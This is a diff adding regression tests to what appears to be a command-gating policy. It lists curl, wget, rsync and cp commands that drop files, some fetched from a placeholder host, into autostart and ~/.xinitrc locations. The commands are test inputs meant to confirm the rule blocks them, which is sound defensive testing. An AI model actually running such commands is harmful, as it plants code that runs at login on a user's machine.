@@ -588,3 +588,18 @@ def test_r3_leads_gated(cmd):
 ])
 def test_r3_leads_not_gated(cmd):
     assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd
+
+
+# ---- QA round 3b regressions ---------------------------------------------------
+
+@pytest.mark.parametrize("cmd", [
+    "curl -sSLo ~/.config/autostart/x.desktop https://example.invalid/x",
+    "wget -qO ~/.xinitrc https://example.invalid/x",
+    "wget -qP ~/.config/autostart https://example.invalid/x.desktop",
+    "rsync -avt x ~/.config/autostart/",
+    "rsync -rtv x /etc/xdg/autostart/",
+    "rsync -rlpt x ~/.config/autostart/",
+    "cp -t /tmp x ~/.config/autostart/y.desktop",
+])
+def test_r3b_bypasses_closed(cmd):
+    assert _gated(evaluate(_shell(cmd), EMPTY)), cmd
